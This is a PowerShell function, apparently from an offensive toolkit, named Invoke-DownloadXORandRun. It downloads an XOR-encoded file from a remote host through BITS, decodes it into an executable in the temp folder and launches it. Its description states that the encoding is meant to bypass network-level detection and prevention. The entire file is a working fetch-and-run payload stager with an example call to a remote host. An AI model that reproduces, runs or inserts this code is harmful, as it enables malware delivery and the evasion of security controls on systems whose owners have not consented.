function Invoke-DownloadXORandRun{
<#
  .SYNOPSIS
  This module downloads an XOR encoded file via BITS and runs it.
  
  .Description
  To attempt to bypass network level detection and prevention systems, this module downloads an XOR encoded executable via BITS and runs it.
  Use a single-byte value to encode the payload and the same value for the -XOREncodeKey parameter

  
  .Parameter
  pURL - the remote path of the single-byte encoded file
  
  .Parameter
  XOREncodeKey - the value of the XOR Encoding

  .Example
  Invoke-DownloadXORandRun -pURL http://<remotehost>/6aenc.out -XorEncodeKey 6A


  #>

Param (

    [Parameter(Position = 0, Mandatory = $true)]
    [string]
    $pURL = "",
 
    [Parameter(Position = 0, Mandatory = $false)]
    [string]
    $XorEncodeKey = ""

    )
Import-Module BitsTransfer

$Job = Start-BitsTransfer -Source $pURL -Destination $env:temp\payload -Asynchronous

while (($Job.JobState -eq "Transferring") -or ($Job.JobState -eq "Connecting")) `
       { sleep 5;} # Poll for status, sleep for 5 seconds, or perform an action.

Switch($Job.JobState)
{
	"Transferred" {Complete-BitsTransfer -BitsJob $Job}
	"Error" {$Job | Format-List } # List the errors.
	default {"Other action"} #  Perform corrective action.
}

$DestinationFile = "$env:temp\payload"

$XorEncodeKey = "0x" + $XorEncodeKey
$ofile = $DestinationFile + ".exe"
$bytes = [System.IO.File]::ReadAllBytes("$DestinationFile")

for($i=0; $i -lt $bytes.count ; $i++)
{
$bytes[$i] = $bytes[$i] -bxor $XorEncodeKey

}
[System.IO.File]::WriteAllBytes("$oFile", $bytes)

Invoke-Item $env:temp\payload.exe

}